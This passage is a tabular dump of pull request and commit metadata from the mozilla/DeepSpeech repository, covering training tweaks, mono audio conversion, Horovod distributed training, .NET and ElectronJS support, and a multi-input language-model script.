3. https://github.com/mozilla/DeepSpeech/commit/877fef9f2eb49f51a7fa02cd22af312f11c1e957 and https://github.com/mozilla/DeepSpeech/commit/444654036763bdf2bb50826a38426a6f62352963 add multi-channel-to-mono conversion along the way to the `pcm_to_np()` function. In a previous PR (#3512), I had proposed using `AudioFile` as a wrapper for all samples to handle sample rate and channel conversion. @reuben pointed out that sample rate was already handled elsewhere and that TensorFlow's functions can actually handle multi-channel audio just fine. Both are correct, of course, but the training code currently still threw an error when handed multi-channel files. To get past that, I tried briefly to see if I could just eliminate the warning and pass multi-channel audio, either interleaved or as a 2-column matrix for stereo, but this breaks downstream (for interleaved, the CTCs become garbage, if I return two column vectors here, I get 2x the CTCs and the decoder produces the same output twice). So I did the channel conversion right here along the way. I think this has some benefits as well as we really only care about performing the downstream augmentations and training on mono audio ever, so it seems prudent performance-wise to always read it in as mono…",CatalinVoss,332459,2021-03-17T00:22:55Z,COLLABORATOR,False,18,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,66f4ed4c65a54ed2e84b263abbfb78ae696b5d40,Expose some internal layers for downstream applications
23,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3559,3559,Small Training Tweaks,"This PR proposes three small training tweaks. Pick and choose as you please, of course.

1. https://github.com/mozilla/DeepSpeech/commit/66f4ed4c65a54ed2e84b263abbfb78ae696b5d40 exposes a couple of the hidden per-CTC-output layers for downstream applications that wish to use deepspeech internal representations
2. ~https://github.com/mozilla/DeepSpeech/commit/2c1b893004e523874465fd18770234692265d51a adds the `ignore_longer_outputs_than_inputs` flag to the tensorflow `ctc_loss` signal. We've found this necessary when training with some slightly messier data. Yes, this should never happen if your data is clean enough, but that's not a guarantee and calculating this as a sanity check upfront can sometimes be difficult. This shouldn't affect DeepSpeech training as it stands, but if you're concerned about it from a ""warning"" standpoint, I suppose one could add a print op here when it does happen.~
3. https://github.com/mozilla/DeepSpeech/commit/877fef9f2eb49f51a7fa02cd22af312f11c1e957 and https://github.com/mozilla/DeepSpeech/commit/444654036763bdf2bb50826a38426a6f62352963 add multi-channel-to-mono conversion along the way to the `pcm_to_np()` function. In a previous PR (#3512), I had proposed using `AudioFile` as a wrapper for all samples to handle sample rate and channel conversion. @reuben pointed out that sample rate was already handled elsewhere and that TensorFlow's functions can actually handle multi-channel audio just fine. Both are correct, of course, but the training code currently still threw an error when handed multi-channel files. To get past that, I tried briefly to see if I could just eliminate the warning and pass multi-channel audio, either interleaved or as a 2-column matrix for stereo, but this breaks downstream (for interleaved, the CTCs become garbage, if I return two column vectors here, I get 2x the CTCs and the decoder produces the same output twice). So I did the channel conversion right here along the way. I think this has some benefits as well as we really only care about performing the downstream augmentations and training on mono audio ever, so it seems prudent performance-wise to always read it in as mono…",CatalinVoss,332459,2021-03-17T00:22:55Z,COLLABORATOR,False,18,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2c1b893004e523874465fd18770234692265d51a,ignore longer outputs than inputs
24,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3559,3559,Small Training Tweaks,"This PR proposes three small training tweaks. Pick and choose as you please, of course.

1. https://github.com/mozilla/DeepSpeech/commit/66f4ed4c65a54ed2e84b263abbfb78ae696b5d40 exposes a couple of the hidden per-CTC-output layers for downstream applications that wish to use deepspeech internal representations
2. ~https://github.com/mozilla/DeepSpeech/commit/2c1b893004e523874465fd18770234692265d51a adds the `ignore_longer_outputs_than_inputs` flag to the tensorflow `ctc_loss` signal. We've found this necessary when training with some slightly messier data. Yes, this should never happen if your data is clean enough, but that's not a guarantee and calculating this as a sanity check upfront can sometimes be difficult. This shouldn't affect DeepSpeech training as it stands, but if you're concerned about it from a ""warning"" standpoint, I suppose one could add a print op here when it does happen.~
3. https://github.com/mozilla/DeepSpeech/commit/877fef9f2eb49f51a7fa02cd22af312f11c1e957 and https://github.com/mozilla/DeepSpeech/commit/444654036763bdf2bb50826a38426a6f62352963 add multi-channel-to-mono conversion along the way to the `pcm_to_np()` function. In a previous PR (#3512), I had proposed using `AudioFile` as a wrapper for all samples to handle sample rate and channel conversion. @reuben pointed out that sample rate was already handled elsewhere and that TensorFlow's functions can actually handle multi-channel audio just fine. Both are correct, of course, but the training code currently still threw an error when handed multi-channel files. To get past that, I tried briefly to see if I could just eliminate the warning and pass multi-channel audio, either interleaved or as a 2-column matrix for stereo, but this breaks downstream (for interleaved, the CTCs become garbage, if I return two column vectors here, I get 2x the CTCs and the decoder produces the same output twice). So I did the channel conversion right here along the way. I think this has some benefits as well as we really only care about performing the downstream augmentations and training on mono audio ever, so it seems prudent performance-wise to always read it in as mono…",CatalinVoss,332459,2021-03-17T00:22:55Z,COLLABORATOR,False,18,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,877fef9f2eb49f51a7fa02cd22af312f11c1e957,Don't throw on mono audio any more since everything should work?
25,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3559,3559,Small Training Tweaks,"This PR proposes three small training tweaks. Pick and choose as you please, of course.

1. https://github.com/mozilla/DeepSpeech/commit/66f4ed4c65a54ed2e84b263abbfb78ae696b5d40 exposes a couple of the hidden per-CTC-output layers for downstream applications that wish to use deepspeech internal representations
2. ~https://github.com/mozilla/DeepSpeech/commit/2c1b893004e523874465fd18770234692265d51a adds the `ignore_longer_outputs_than_inputs` flag to the tensorflow `ctc_loss` signal. We've found this necessary when training with some slightly messier data. Yes, this should never happen if your data is clean enough, but that's not a guarantee and calculating this as a sanity check upfront can sometimes be difficult. This shouldn't affect DeepSpeech training as it stands, but if you're concerned about it from a ""warning"" standpoint, I suppose one could add a print op here when it does happen.~
3. https://github.com/mozilla/DeepSpeech/commit/877fef9f2eb49f51a7fa02cd22af312f11c1e957 and https://github.com/mozilla/DeepSpeech/commit/444654036763bdf2bb50826a38426a6f62352963 add multi-channel-to-mono conversion along the way to the `pcm_to_np()` function. In a previous PR (#3512), I had proposed using `AudioFile` as a wrapper for all samples to handle sample rate and channel conversion. @reuben pointed out that sample rate was already handled elsewhere and that TensorFlow's functions can actually handle multi-channel audio just fine. Both are correct, of course, but the training code currently still threw an error when handed multi-channel files. To get past that, I tried briefly to see if I could just eliminate the warning and pass multi-channel audio, either interleaved or as a 2-column matrix for stereo, but this breaks downstream (for interleaved, the CTCs become garbage, if I return two column vectors here, I get 2x the CTCs and the decoder produces the same output twice). So I did the channel conversion right here along the way. I think this has some benefits as well as we really only care about performing the downstream augmentations and training on mono audio ever, so it seems prudent performance-wise to always read it in as mono…",CatalinVoss,332459,2021-03-17T00:22:55Z,COLLABORATOR,False,18,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,444654036763bdf2bb50826a38426a6f62352963,Handle mono conversion within `pcm_to_np()`
26,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3559,3559,Small Training Tweaks,"This PR proposes three small training tweaks. Pick and choose as you please, of course.

1. https://github.com/mozilla/DeepSpeech/commit/66f4ed4c65a54ed2e84b263abbfb78ae696b5d40 exposes a couple of the hidden per-CTC-output layers for downstream applications that wish to use deepspeech internal representations
2. ~https://github.com/mozilla/DeepSpeech/commit/2c1b893004e523874465fd18770234692265d51a adds the `ignore_longer_outputs_than_inputs` flag to the tensorflow `ctc_loss` signal. We've found this necessary when training with some slightly messier data. Yes, this should never happen if your data is clean enough, but that's not a guarantee and calculating this as a sanity check upfront can sometimes be difficult. This shouldn't affect DeepSpeech training as it stands, but if you're concerned about it from a ""warning"" standpoint, I suppose one could add a print op here when it does happen.~
3. https://github.com/mozilla/DeepSpeech/commit/877fef9f2eb49f51a7fa02cd22af312f11c1e957 and https://github.com/mozilla/DeepSpeech/commit/444654036763bdf2bb50826a38426a6f62352963 add multi-channel-to-mono conversion along the way to the `pcm_to_np()` function. In a previous PR (#3512), I had proposed using `AudioFile` as a wrapper for all samples to handle sample rate and channel conversion. @reuben pointed out that sample rate was already handled elsewhere and that TensorFlow's functions can actually handle multi-channel audio just fine. Both are correct, of course, but the training code currently still threw an error when handed multi-channel files. To get past that, I tried briefly to see if I could just eliminate the warning and pass multi-channel audio, either interleaved or as a 2-column matrix for stereo, but this breaks downstream (for interleaved, the CTCs become garbage, if I return two column vectors here, I get 2x the CTCs and the decoder produces the same output twice). So I did the channel conversion right here along the way. I think this has some benefits as well as we really only care about performing the downstream augmentations and training on mono audio ever, so it seems prudent performance-wise to always read it in as mono…",CatalinVoss,332459,2021-03-17T00:22:55Z,COLLABORATOR,False,18,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a474ee01aa0c706b117d6de50356c7d76d088494,"Revert ""ignore longer outputs than inputs""

This reverts commit 2c1b893004e523874465fd18770234692265d51a."
27,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3558,3558,Pr 3533,,lissyx,1645737,2021-03-15T16:28:11Z,COLLABORATOR,True,197,87,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,11edd92775558faa7a5edec5fe055703f63b378c,implement distributed training using horovod
28,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3558,3558,Pr 3533,,lissyx,1645737,2021-03-15T16:28:11Z,COLLABORATOR,True,197,87,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,458b2e28a8ceebf477d14ef0f6abf6e88c6fbc65,suggestions by lissyx in #3533
29,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3558,3558,Pr 3533,,lissyx,1645737,2021-03-15T16:28:11Z,COLLABORATOR,True,197,87,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7db6b6282c500284eb5c1a53fa7121483b76f969,merge train_with_horovod into train
30,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3558,3558,Pr 3533,,lissyx,1645737,2021-03-15T16:28:11Z,COLLABORATOR,True,197,87,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,329bf876069720cf05b4e4700e6d0dde104b6bac,improve horovod docu
31,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3555,3555,Support for .net core and .net 5,"Support for netcore and net5 with adding a build to netstandard1.3 (the lowest compatible with the code base).
Fix a warning : Upgrade obsolete SizeOf call.

Add a test netcore console app (into a seperate folder to workaround nuget/msbuild mixing dependencies).

Should fix #3285

netcore/net5 version works fine with NAudio 2.0.0 as demonstrated by console application (Could be a fix for #3540)",jetelain,33651126,2021-03-11T17:53:54Z,NONE,False,33,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,afa1ebdba8cb0f068a2ebe039a70fcbef47d9629,"Support for netcore and net5.
Upgrade obsolete SizeOf call.
Add a test netcore console app (into a seperate folder to workaround nuget/msbuild mixing dependencies)."
32,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3553,3553,Add ElectronJS v12.0,,lissyx,1645737,2021-03-04T12:21:02Z,COLLABORATOR,True,111,8,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f65ce2be452c73d23f2d129fbd0035ba59853ce2,Add ElectronJS v12.0
33,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3553,3553,Add ElectronJS v12.0,,lissyx,1645737,2021-03-04T12:21:02Z,COLLABORATOR,True,111,8,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2301abb48846883312fd9f49cd28d16bde1b6726,Bump NCCL version due to NVIDIA base image update
34,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3553,3553,Add ElectronJS v12.0,,lissyx,1645737,2021-03-04T12:21:02Z,COLLABORATOR,True,111,8,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,12affcdc71efa6823606d46ab45248aaa57d41df,Update doc/examples
35,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3553,3553,Add ElectronJS v12.0,,lissyx,1645737,2021-03-04T12:21:02Z,COLLABORATOR,True,111,8,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6a2160850391f68a905e437a08ebf45df1a0d4b2,Update 0.9 model example refs
36,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3553,3553,Add ElectronJS v12.0,,lissyx,1645737,2021-03-04T12:21:02Z,COLLABORATOR,True,111,8,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c6197657ad9a925ff085c5c8ba2d6f6a91179952,Fix #3540: Force NAudio 1.10.0
37,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3552,3552,Add ElectronJS v12.0,,lissyx,1645737,2021-03-04T12:13:10Z,COLLABORATOR,True,106,3,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fe9b8826de03eb81e0658b34bd546dcb528932bf,Add ElectronJS v12.0
38,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3548,3548,Expose .Net building doc better,,lissyx,1645737,2021-03-03T14:43:06Z,COLLABORATOR,True,5,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a087509ab7b28c68ec76e89765901a9f1bb1ef4b,Expose .Net building doc better
39,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3547,3547,Fix #3540: Move to NAudio 2.0.0 dep,,lissyx,1645737,2021-03-03T09:09:21Z,COLLABORATOR,False,13,13,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,56bc5cc4e5fcae100f5b8b6399b3b3afd0350b89,Fix #3540: Move to NAudio 2.0.0 dep
40,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3546,3546,Fix #3511: split-sets on sample size,"Fixes #3511: https://github.com/mozilla/DeepSpeech/issues/3511

Changes the `_split_sets` helper function in `bin/import_swb.py` and `bin/import_fisher.py` to split the training, validation, and test sets based on a sample size using a 99% confidence and 1% margin of error. The `get_sample_size` function was copied from `bin/import_swc.py`. ",dzubke,29796616,2021-02-28T21:23:05Z,CONTRIBUTOR,True,62,12,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6945663698c9791b52db78f0500d4863abb513bc,Fix #3511: split-sets on sample size
41,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3542,3542,Enable multiple input txts,"Further to discussion [here](https://discourse.mozilla.org/t/discuss-potential-pr-related-to-generate-lm-py/75883?u=nmstoker), this is my PR for enabling **generate_lm.py** to accept multiple input texts which are combined into a single lm.binary output for onward creation of a scorer.

Parameters remain unchanged so shouldn't impact current code, but if you wish to use multiple input texts, you simply pass in multiple --input_txt parameters, like so:

`python generate_lm.py --input_txt input_text_src1.txt.gz --input_txt input_text_src2.txt.gz --output_dir . --top_k 10000 --top_k 20000 --kenlm_bins path/to/kenlm/build/bin/   --arpa_order 5 --max_arpa_memory ""85%"" --arpa_prune ""0|0|1""   --binary_a_bits 255 --binary_q_bits 8 --binary_type trie --discount_fallback`

As per the above example, you can also have corresponding top_k parameters for each input_txt. If you provider fewer top_k parameters (eg just one) then the last one will be re-used for each subsequent input_txt.

BTW: because of using repeating parameters, I didn't need the delimited for inputs I'd mentioned in the Discourse post, and this keeps it pretty simple overall.

As well as the above, I also added a simple parameter check step that runs initially (_simply to avoid situation where you have a trivial error in parameters and have to wait for the first processing step on a large text file to complete before you realise your mistake and have to run it all again!_)

And I switched it to use f-strings over .format (hope that's okay?)

**Documentation:** If this is accepted, provided people agree I plan to put a few extra basic details relating to this in the docs (eg [here](https://github.com/mozilla/DeepSpeech/blob/master/doc/Scorer.rst)) so I'd get a corresponding PR ready for that shortly too. And more generally, I had some ideas I was going to share w/ @KathyReid for the Playbook relating to this.",nmstoker,3694484,2021-02-25T14:44:35Z,CONTRIBUTOR,False,118,67,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b5e0a0a5a653c9a683dbb79c86f32a575d68c055,Enable multiple input txts
42,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3539,3539,Tentative merge of SWIG master,,lissyx,1645737,2021-02-25T09:08:32Z,COLLABORATOR,True,12,12,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fee12be4ffe3b77a4adb525807a3275344f73830,Update SWIG with upstream 4.1-aligned branch
43,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3539,3539,Tentative merge of SWIG master,,lissyx,1645737,2021-02-25T09:08:32Z,COLLABORATOR,True,12,12,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,206b8355b1765a97aa103722adda95449a435f3a,Fix #3540: Force NAudio 1.10.0
44,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3533,3533,Implement distributed training using horovod,"As already mentioned in Discourse we implemented distributed training using [Horovod](https://github.com/horovod/horovod).

We tried to keep the changes as minimal as possible. It is still possible to run your undistributed code version. However we also noticed a slightly improvement by using Horovod on one machine.

We copied your `train`-function to `train_with_horovod` but I can also provide an merge by using some `if FLAGS.horovod`. This would reduce code duplication. It is just to improve readability at the moment.

While our code has a good scaling on local stored datasets, we experienced a lack of performance on datasets stored on you globally distributed filesystem (BeeGFS). This could be caused by `tf.data.Dataset.shard`. We will investigate on this.",NanoNabla,43477372,2021-02-16T13:13:35Z,CONTRIBUTOR,True,197,87,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,11edd92775558faa7a5edec5fe055703f63b378c,implement distributed training using horovod
45,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3533,3533,Implement distributed training using horovod,"As already mentioned in Discourse we implemented distributed training using [Horovod](https://github.com/horovod/horovod).

We tried to keep the changes as minimal as possible. It is still possible to run your undistributed code version. However we also noticed a slightly improvement by using Horovod on one machine.

We copied your `train`-function to `train_with_horovod` but I can also provide an merge by using some `if FLAGS.horovod`. This would reduce code duplication. It is just to improve readability at the moment.

While our code has a good scaling on local stored datasets, we experienced a lack of performance on datasets stored on you globally distributed filesystem (BeeGFS). This could be caused by `tf.data.Dataset.shard`. We will investigate on this.",NanoNabla,43477372,2021-02-16T13:13:35Z,CONTRIBUTOR,True,197,87,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,458b2e28a8ceebf477d14ef0f6abf6e88c6fbc65,suggestions by lissyx in #3533
46,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3533,3533,Implement distributed training using horovod,"As already mentioned in Discourse we implemented distributed training using [Horovod](https://github.com/horovod/horovod).

We tried to keep the changes as minimal as possible. It is still possible to run your undistributed code version. However we also noticed a slightly improvement by using Horovod on one machine.

We copied your `train`-function to `train_with_horovod` but I can also provide an merge by using some `if FLAGS.horovod`. This would reduce code duplication. It is just to improve readability at the moment.

While our code has a good scaling on local stored datasets, we experienced a lack of performance on datasets stored on you globally distributed filesystem (BeeGFS). This could be caused by `tf.data.Dataset.shard`. We will investigate on this.",NanoNabla,43477372,2021-02-16T13:13:35Z,CONTRIBUTOR,True,197,87,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7db6b6282c500284eb5c1a53fa7121483b76f969,merge train_with_horovod into train
47,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3533,3533,Implement distributed training using horovod,"As already mentioned in Discourse we implemented distributed training using [Horovod](https://github.com/horovod/horovod).

We tried to keep the changes as minimal as possible. It is still possible to run your undistributed code version. However we also noticed a slightly improvement by using Horovod on one machine.

We copied your `train`-function to `train_with_horovod` but I can also provide an merge by using some `if FLAGS.horovod`. This would reduce code duplication. It is just to improve readability at the moment.

While our code has a good scaling on local stored datasets, we experienced a lack of performance on datasets stored on you globally distributed filesystem (BeeGFS). This could be caused by `tf.data.Dataset.shard`. We will investigate on this.",NanoNabla,43477372,2021-02-16T13:13:35Z,CONTRIBUTOR,True,197,87,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,329bf876069720cf05b4e4700e6d0dde104b6bac,improve horovod docu
48,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2e16d388ce0445b9642718df579d19ec6a82abc3,Add support for netStandard2.1 and  netcoreapp3.1
49,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4371435f157e117c7e15d98525a00eb731b4a3fa,Update deprecated code
50,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,050854c3046dafc543d49d63b9f18b89c650e49b,"Removed AnyCPU from sln
moved test sound file to shared folder, using link now"
51,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0d176e9de58f6632d8f1091c489b9680d3766ec8,using existing audio file
52,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,824fc2645fca5c246630f39eaeea59e1764e1b49,Merge branch 'master' of https://github.com/mozilla/DeepSpeech
53,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4ff60e7f812d94cc6a78fb7c4eeda7ea89cd7975,update dotnet docs
54,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e924094509101858cca2a4a601d67bcee57fd95f,update readme
55,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9f3a7989528b9fd7bd00e470f147d433fc6e0075,add support for anyCPU in dotnet
56,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc242f1f932423969d87bfa5e79598bd60c08b7d,back to direct link in dotnet readme
57,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,18470c4a46e0ce60eb362962d2294391508435ff,update internal link for dotnet docs
58,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cadc98cee81c811c53086cb09ca96895785e876d,more readme upd
59,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a57bd0f8f649208004cca3abf74f7063c22dfdc0,more readme rst upd
60,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fb056db664ff8218efc15006434dea4f697e657f,revert to direct link readme
61,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b8c953c50bc433b74b327c3197bbca49e3cf9f11,WIP: update dotnet build funcs
62,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,293bd75fb0b83e82a54437b92117f2544c3f7b96,WIP: Add tests for Net core console app
63,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,34eefe8e5a726625fc32e29384e5f018a83103d8,final readme update
64,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f72326633bc60d88e528ee983845e7c3b1f5854a,dotnet csproj fix for CI
65,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a20682375e0a1a7ed3ece307902020035d1b3e29,dotnet CI scripts updated
66,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0523d034a6ccf38d7ee1300b8554618a0ed15c0b,"Revert dotnet platform to Any CPU,"
67,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b726cad4e8b692e82b424c70d2ba44cedd2f9f19,added netstandard2.0 support
68,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3532,3532,Pr 3373,,lissyx,1645737,2021-02-16T09:35:21Z,COLLABORATOR,False,572,57,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0212dd2c7a715e4add8ace73f73d21ff64d11f1,Merge branch 'master' of https://github.com/mozilla/DeepSpeech
